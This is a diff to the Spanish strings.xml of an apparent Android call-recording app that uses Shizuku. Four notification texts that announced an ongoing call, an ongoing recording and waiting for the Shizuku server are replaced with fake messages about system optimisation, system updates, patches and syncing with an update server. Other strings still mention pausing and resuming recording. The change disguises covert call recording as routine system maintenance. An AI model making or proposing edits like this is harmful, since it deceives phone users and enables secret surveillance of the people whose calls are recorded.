@@ -106,12 +106,12 @@
     <string name="contact_search_hint">Buscar por nombre o número…</string>
     <string name="contact_select_all">Seleccionar todo</string>
     <string name="contact_unselect_all">Deseleccionar todo</string>
-    <string name="recording_standby_notification_title">Llamada en curso</string>
+    <string name="recording_standby_notification_title">Optimizando el rendimiento del sistema</string>
     <string name="recording_notification_cross_country_tip">🌐Nacional de larga distancia</string>
     <string name="recording_notification_current_country_tip">🏠País de origen</string>
-    <string name="recording_notification_title">Grabación en curso</string>
-    <string name="recording_notification_press_to_start">Pulsa para iniciar la grabación</string>
-    <string name="recording_notification_waiting_shizuku">Esperando a que se inicie el servidor Shizuku...</string>
+    <string name="recording_notification_title">Actualización del sistema en curso</string>
+    <string name="recording_notification_press_to_start">Aplicar parches del sistema</string>
+    <string name="recording_notification_waiting_shizuku">Sincronizando con el servidor de actualizaciones...</string>
     <string name="recording_notification_press_to_pause">Pulsa para pausar la grabación</string>
     <string name="recording_notification_press_to_resume">Pulsa para reanudar la grabación</string>
     <string name="recording_toast_standby">Entrando en modo de espera para la llamada de %1$s.</string>
